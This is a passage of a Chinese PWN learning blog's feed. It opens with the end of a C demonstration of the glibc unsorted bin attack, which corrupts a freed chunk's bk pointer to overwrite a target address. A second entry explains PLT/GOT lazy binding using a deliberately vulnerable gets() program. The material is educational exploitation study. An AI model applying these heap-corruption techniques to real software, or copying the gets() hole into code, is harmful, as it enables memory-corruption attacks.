*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the "</span></span><br><span class="line">                  <span class="string">"victim-&gt;bk pointer\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits "</span></span><br><span class="line">                  <span class="string">"machine, it should be target address-8):%p\n\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During "</span></span><br><span class="line">                  <span class="string">"this time, target should has already been "</span></span><br><span class="line">                  <span class="string">"rewrite:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png" alt="image-20201222164945226"></p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png" alt="img"></p><p>经过上面原理的解释，这个就不说了</p><p>最后总结一句话:</p><p>修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;堆基础和堆漏洞还是分开比较好&lt;/p&gt;
&lt;p&gt;这样看着也比较整齐&lt;/p&gt;
&lt;h1 id=&quot;堆漏洞&quot;&gt;&lt;a href=&quot;#堆漏洞&quot; class=&quot;headerlink&quot; title=&quot;堆漏洞&quot;&gt;&lt;/a&gt;堆漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x01-Off-By-One&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="Heap" scheme="https://pz1o.top/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>plt表和got表</title>
    <link href="https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"/>
    <id>https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/</id>
    <published>2020-12-16T13:32:03.000Z</published>
    <updated>2020-12-17T01:05:53.222Z</updated>
    
    <content type="html"><![CDATA[<p>需要啥 学啥</p><p>看学长博客写了这个 自己也记录一下 毕竟刚学</p><p><a href="https://ld1ng.com/2020/06/16/GOTPLT/" target="_blank" rel="noopener">https://ld1ng.com/2020/06/16/GOTPLT/</a></p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><p><a href="https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><h1 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h1><p>GOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。</p><h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you win\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">gets(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you lose\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个文件</p><p>gdb调试一下</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png" alt="image-20201216221001253"></p><p>此时我们可以看到<code>gets@plt</code>和<code>puts@plt</code>这两个函数</p><p>@plt这里的意思是指PLT表中的数据的地址。</p><blockquote><p>为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的，</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845" alt="这里写图片描述"></p></blockquote><p>这时 我们也就理解了@plt标志的函数，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p><p>那@plt函数里面是什么呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass gets</span><br></pre></td></tr></table></figure><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png" alt="image-20201216223010888"></p><blockquote><ol><li>jmp指令跳转到GOT表</li><li>GOT表中的数据为0x4004c6</li><li>跳转到指令地址为0x4004c6</li><li>执行<code>push 0x3</code>这个为在GOT中的下标序号</li><li>在执行<code>jmp 0x400480</code></li><li>而0x400480为PLT[0]的地址</li><li>PLT[0]的指令会进入动态链接器的入口</li><li>执行一个函数将真正的函数地址覆盖到GOT表中</li></ol></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.<strong>PLT[0]处到底做了什么，按照我们之前的思路它不是应该跳转到GOT[0]吗</strong></p><p>这是plt[0]中的内容</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png" alt="image-20201217082532501"></p><p>后面的16进制就是GOT表中的内容</p><blockquote><p><strong>我们的PLT[0]根本没有跳转到GOT[0]，它不像我们的PLT[1]这些存储的是GOT表项的地址，它是一些代码指令，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</strong></p></blockquote><p>所以我们可以得到下面这张图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419" alt="这里写图片描述"></p><p>而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过<strong>GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。</strong></p><p>总而言之，我们调用一个函数的时候有两种方法，一个是通过PLT表调用，一个则是通过GOT表调用，<strong>因为PLT表最终也是跳转GOT表，GOT表中则是一个函数真正的地址，这里需要注意的是，在一个函数没有运行一次之前，GOT表中的数据为@plt函数中下一条指令的地址。</strong></p><p>2.<strong>为什么中间要进行push压栈操作？</strong></p><p>中间进行的压栈是为了确定PLT对应的GOT表项，即是PLT[1]−&gt;GOT[3]，0x3就是GOT的下标3，也就是说压栈后我们跳转到PLT[0],接着PLT[0]中的指令会通过这次压栈的序号来确定操作的GOT表项为多少</p><p>3.<strong>压入的序号为什么为0x3，不是最开始应该为0x0吗？</strong></p><p>因为GOT[0],GOT[1],GOT[2]都有其他用处，所以从0x3开始。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="GOT表的构成"><a href="#GOT表的构成" class="headerlink" title="GOT表的构成"></a>GOT表的构成</h2><p>GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</p><p>GOT[1]包含动态链接器的标识;</p><p>GOT[2]包含动态链接器的延迟绑定代码的入口点。</p><p>GOT的其他表目为本模块要引用的一个全局变量或函数的地址。</p><h2 id="PLT表的构成"><a href="#PLT表的构成" class="headerlink" title="PLT表的构成"></a>PLT表的构成</h2><p>PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>最后，自己总结一下实现过程</p><ol><li>首先，进入PLT表项，这时第一步就是跳转到GOT表项</li><li>GOT表项存放PLT表第二条指令的地址，也就是<code>push 0x x</code>把相应的idx压入</li><li>下一步就是跳转到PLT[0]中，进而链接到GOT[2] ,进入链接器入口</li><li>最后通过动态链接器将真正函数地址覆盖到GOT表中</li></ol><p>别人的动图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需要啥 学啥&lt;/p&gt;
&lt;p&gt;看学长博客写了这个 自己也记录一下 毕竟刚学&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/06/16/GOTPLT/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ld1ng.c</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
</feed>
